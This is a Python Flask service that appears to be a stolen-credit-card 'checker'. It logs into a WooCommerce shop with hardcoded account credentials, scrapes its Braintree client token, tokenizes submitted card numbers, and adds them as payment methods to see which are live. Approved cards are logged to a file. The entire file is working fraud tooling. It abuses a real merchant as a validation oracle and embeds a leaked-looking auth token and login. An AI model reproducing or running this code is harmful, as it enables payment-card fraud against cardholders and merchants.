import requests
from bs4 import BeautifulSoup
import re
import base64
import json
import uuid
import time
import os
import random
from flask import Flask, jsonify, request
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize Flask app
app = Flask(__name__)

class BraintreeLoginChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        # Kept as fallback, but dynamic is preferred
        self.known_auth_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjgwNTE4NDYsImp0aSI6IjYyYjhjMjNlLTE3ZWUtNGRjNS05ODM4LTI0MjM0MDgwZDBiNCIsInN1YiI6IjNteWQ5cXJxemZqa3c5NDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNteWQ5cXJxemZqa3c5NDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.IDFUkXr3E9_qrYgMhfw8Zz8ZUw7kMMxHAqIlgJFD1Zk0aGphMLZyIuvv3hvSKa5nvA2T26EZWwREZEVpCT-6yw"
    
    def login(self, domain, username, password):
        login_url = f"{domain}/my-account/"
        
        try:
            response = self.session.get(login_url, headers=self.headers, verify=False, timeout=15)
        except Exception as e:
            return False, f"Connection failed: {str(e)}"

        if response.status_code != 200:
            return False, f"Failed to get login page (Status: {response.status_code})"
        
        response_text = response.text if response.text else ""
        soup = BeautifulSoup(response_text, 'html.parser')
        nonce_input = soup.find("input", {"name": "woocommerce-login-nonce"})
        
        login_nonce = None
        if not nonce_input:
            match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', response_text)
            if match:
                login_nonce = match.group(1)
        else:
            login_nonce = nonce_input.get("value")
        
        if not login_nonce:
            return False, "Login nonce not found in page source"
        
        login_data = {
            'username': username,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        
        login_headers = self.headers.copy()
        login_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url,
            'Origin': domain
        })
        
        try:
            login_response = self.session.post(login_url, headers=login_headers, data=login_data, verify=False, timeout=15)
        except Exception as e:
            return False, f"Post login failed: {str(e)}"
            
        login_text = login_response.text if login_response.text else ""

        if "Log out" in login_text or "My Account" in login_text or "Dashboard" in login_text:
            return True, self.session
        else:
            return False, "Login failed - Invalid credentials or redirect loop"
    
    def get_auth_tokens(self, domain, use_known_token=True):
        payment_url = f"{domain}/my-account/add-payment-method/"
        
        headers = self.headers.copy()
        headers['Referer'] = f"{domain}/my-account/"
        
        try:
            response = self.session.get(payment_url, headers=headers, verify=False, timeout=15)
        except Exception as e:
            return None, None, f"Connection error fetching payment page: {str(e)}"
        
        if response.status_code != 200:
            return None, None, f"Failed to get payment page (Status: {response.status_code})"
        
        response_text = response.text if response.text else ""

        # 1. Get Nonce
        add_nonce = None
        match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response_text)
        if match:
            add_nonce = match.group(1)
        else:
            return None, None, "Payment nonce not found"
        
        # 2. Get Auth Token (Dynamic Scraper)
        auth_token = None
        
        # Patterns used by WooCommerce Braintree
        patterns = [
            r'clientToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'wc_braintree_client_token\s*=\s*["\']([^"\']+)["\']',
            r'authorization_fingerprint["\']?\s*:\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                # Often the token is a JSON string or raw JWT
                potential_token = matches[0]
                if len(potential_token) > 50:
                    auth_token = potential_token
                    break

        # Fallback: Search inside script tags for JWT structure
        if not auth_token:
            soup = BeautifulSoup(response_text, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    content = script.string
                    # Look for JWT format: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
                    jwt_pattern = r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'
                    jwt_matches = re.findall(jwt_pattern, content)
                    if jwt_matches:
                        # Pick the longest one (usually the client token)
                        auth_token = max(jwt_matches, key=len)
                        break
        
        # Use hardcoded if forced or if dynamic failed
        if use_known_token or not auth_token:
            if not auth_token:
                print("[!] Dynamic token failed, using fallback token (might be expired).")
            auth_token = self.known_auth_token
        
        return add_nonce, auth_token, "Success"
    
    def tokenize_card(self, card_data, auth_token):
        n, mm, yy, cvc = card_data
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin last4 cardType expirationMonth expirationYear } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        token_headers = {
            'authorization': f'Bearer {auth_token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': self.headers['User-Agent']
        }
        
        try:
            response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=token_headers,
                json=json_data,
                verify=False,
                timeout=15
            )
        except Exception as e:
            print(f"[!] Tokenize Request Exception: {e}")
            return None
        
        # Check for API Errors (e.g., 401 Unauthorized, 400 Bad Request)
        if response.status_code != 200:
            print(f"[!] Braintree API Error Status: {response.status_code}")
            try:
                error_data = response.json()
                if 'errors' in error_data:
                    print(f"[!] API Error Details: {error_data['errors']}")
            except:
                print(f"[!] Raw Error Response: {response.text[:200]}")
            return None

        try:
            response_data = response.json()
            
            # Check for JSON format errors
            if response_data is None:
                return None
            
            # Successful Tokenization
            if 'data' in response_data and response_data['data'] is not None:
                if 'tokenizeCreditCard' in response_data['data']:
                    token_obj = response_data['data']['tokenizeCreditCard']
                    if token_obj is not None:
                        return token_obj.get('token')
            
            # If we have 'errors' in the JSON, it's a card decline or validation error
            if 'errors' in response_data:
                # We return a special marker to indicate the API responded but declined
                return f"ERROR: {response_data['errors'][0].get('message', 'Unknown API Error')}"
                
        except json.JSONDecodeError:
            return None
        return None
    
    def submit_payment(self, domain, add_nonce, token):
        payment_url = f"{domain}/my-account/add-payment-method/"
        
        submit_headers = self.headers.copy()
        submit_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': payment_url,
            'Origin': domain
        })
        
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa', # Placeholder, usually auto-detected by JS
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        response = self.session.post(payment_url, headers=submit_headers, data=data, verify=False, timeout=20)
        return response

def check_card(cc_line):
    """Check a single credit card"""
    start_time = time.time()
    
    # Configuration
    domain = "https://ddlegio.com"
    username = "xcracker663@gmail.com"
    password = "Xcracker@911"
    
    try:
        checker = BraintreeLoginChecker()
        
        # 1. Login
        success, result = checker.login(domain, username, password)
        if not success:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": f"Login Error: {result}", "time": f"{elapsed_time:.2f}s"}
        
        # 2. Get Auth Tokens
        # CRITICAL FIX: Set use_known_token=False to scrape the live token from ddlegio.com
        add_nonce, auth_token, msg = checker.get_auth_tokens(domain, use_known_token=False)
        
        if not add_nonce:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": f"Error: {msg}", "time": f"{elapsed_time:.2f}s"}
        
        if not auth_token:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": "No auth token available", "time": f"{elapsed_time:.2f}s"}
        
        # 3. Parse Card Data
        try:
            n, mm, yy, cvc = cc_line.strip().split('|')
        except ValueError:
            return {"status": "DECLINED", "response": "Invalid card format. Use CC|MM|YY|CVC", "time": "0.00s"}

        if len(yy) == 2:
            yy = '20' + yy
        
        # 4. Tokenize Card
        token_result = checker.tokenize_card((n, mm, yy, cvc), auth_token)
        
        # Check if tokenization returned an API error message string
        if isinstance(token_result, str) and token_result.startswith("ERROR:"):
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": f"Gateway Error: {token_result}", "time": f"{elapsed_time:.2f}s"}
            
        if not token_result:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": "Card tokenization failed (Invalid token or card)", "time": f"{elapsed_time:.2f}s"}
        
        token = token_result
        
        # 5. Submit Payment
        response = checker.submit_payment(domain, add_nonce, token)
        
        # 6. Parse Response
        response_text = response.text if response.text else ""
        soup = BeautifulSoup(response_text, 'html.parser')
        
        success_div = soup.find('div', class_='woocommerce-message')
        error_div = soup.find('div', class_='woocommerce-error')
        
        final_status = "DECLINED"
        response_msg = "Unknown error"
        is_approved = False
        
        if success_div:
            message = success_div.get_text(strip=True)
            if any(word in message.lower() for word in ['success', 'added', 'approved']):
                final_status = "APPROVED"
                response_msg = message
                is_approved = True
            else:
                response_msg = message
        elif error_div:
            message = error_div.get_text(strip=True)
            if 'cvv' in message.lower() or 'security code' in message.lower():
                response_msg = "Reason: CVV - " + message
            else:
                response_msg = message
        else:
            notice_wrapper = soup.find('div', class_='woocommerce-notices-wrapper')
            if notice_wrapper:
                response_msg = notice_wrapper.get_text(strip=True)
            else:
                response_msg = "No response message found from gateway"

        elapsed_time = time.time() - start_time

        if is_approved:
            try:
                with open('approved.txt', 'a', encoding='utf-8') as approved_file:
                    approved_file.write(f"""=========================
[APPROVED]

Card: {n}|{mm}|{yy}|{cvc}
Response: {response_msg}
Gateway: Braintree Auth (Dynamic Token)
Time: {elapsed_time:.1f}s
Bot By: @FailureFr
=========================

""")
            except Exception as e:
                print(f"Logging error: {e}")

        return {"status": final_status, "response": response_msg, "time": f"{elapsed_time:.2f}s"}
            
    except Exception as e:
        elapsed_time = time.time() - start_time
        # Print stack trace for debugging
        import traceback
        traceback.print_exc()
        return {"status": "DECLINED", "response": f"System Error: {str(e)}", "time": f"{elapsed_time:.2f}s"}

@app.route('/gate=b3/cc=<card>', methods=['GET'])
def check_credit_card(card):
    """Endpoint to check credit card"""
    try:
        if '|' not in card:
            return jsonify({"status": "DECLINED", "response": "Invalid format. Please use: CC_NUMBER|MM|YY|CVC"}), 400
            
        result = check_card(card)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"status": "DECLINED", "response": f"Error: {str(e)}"}), 500

@app.route('/')
def index():
    """Home endpoint with instructions"""
    return """
    <h1>B3 Auth API (Dynamic Token)</h1>
    <p>Use the endpoint: /gate=b3/cc={card}</p>
    <p>Format: CC_NUMBER|MM|YY|CVC</p>
    <p>Example: /gate=b3/cc=4111111111111111|12|25|123</p>
    <p>Target: ddlegio.com</p>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
